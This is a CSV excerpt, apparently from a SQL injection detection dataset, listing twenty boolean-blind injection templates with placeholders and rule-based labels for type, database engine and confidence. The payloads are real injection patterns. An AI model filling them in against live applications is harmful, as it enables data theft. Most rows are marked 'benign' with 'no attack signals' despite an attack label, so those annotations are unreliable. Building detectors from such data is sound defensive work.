row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
41110,"ELT([RANDNUM]=[RANDNUM],[RANDNUM1]) ELT([INFERENCE],[RANDNUM])",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41111,"ELT([RANDNUM]=[RANDNUM],[ORIGVALUE]) ELT([INFERENCE],[ORIGVALUE])",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41112,([RANDNUM]=[RANDNUM])*[RANDNUM1] ([INFERENCE])*[RANDNUM],1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41113,([RANDNUM]=[RANDNUM])*[ORIGVALUE] ([INFERENCE])*[ORIGVALUE],1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41114,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)),1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41115,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END)),1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41116,"(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1) (SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)",1,boolean_blind,heavy_query,generic,0.95,GENERATE_SERIES( detected — heavy_query injection (priority 6) on generic,rule-based
41117,"(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1) (SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)",1,boolean_blind,heavy_query,generic,0.95,GENERATE_SERIES( detected — heavy_query injection (priority 6) on generic,rule-based
41118,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)),1,boolean_blind,union_based,generic,0.95,"UNION ALL SELECT, UNION ALL SELECT detected — union_based injection (priority 7) on generic",rule-based
41119,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)),1,boolean_blind,union_based,generic,0.95,"UNION ALL SELECT, UNION ALL SELECT detected — union_based injection (priority 7) on generic",rule-based
41120,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL),1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41121,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL),1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41122,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL),1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41123,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL) (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL),1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41124,"IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0) IIF([INFERENCE],[RANDNUM],1/0)",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41125,"IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0) IIF([INFERENCE],[ORIGVALUE],1/0)",1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41126,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END) (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END),1,boolean_blind,union_based,oracle,0.95,UNION SELECT detected — union_based injection (priority 7) on oracle,rule-based
41127,(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END) (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END),1,boolean_blind,union_based,oracle,0.95,UNION SELECT detected — union_based injection (priority 7) on oracle,rule-based
41128,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END) (CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END),1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
41129,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END) (CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END),1,boolean_blind,benign,generic,0.8,No attack signals detected in payload,rule-based
